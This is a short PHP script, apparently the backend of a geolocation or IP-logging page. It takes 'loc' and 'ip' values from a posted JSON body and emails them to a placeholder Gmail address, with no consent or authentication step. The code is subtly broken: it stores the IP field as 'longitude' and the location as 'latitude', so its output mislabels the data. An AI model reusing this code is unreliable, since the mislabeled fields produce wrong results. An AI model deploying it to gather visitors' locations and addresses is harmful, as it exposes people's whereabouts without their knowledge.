<?php
header("Content-Type: application/json");
$data = json_decode(file_get_contents("php://input"));

$latitude = $data->loc;
$longitude = $data->ip;

$to = "your-email@gmail.com"; // Replace with your Gmail address
$subject = "Geolocation Data";
$message = "Latitude: $latitude, Longitude: $longitude";
$headers = "From: your-email@gmail.com"; // Replace with your Gmail address

$success = mail($to, $subject, $message, $headers);

echo json_encode(["success" => $success]);
?>
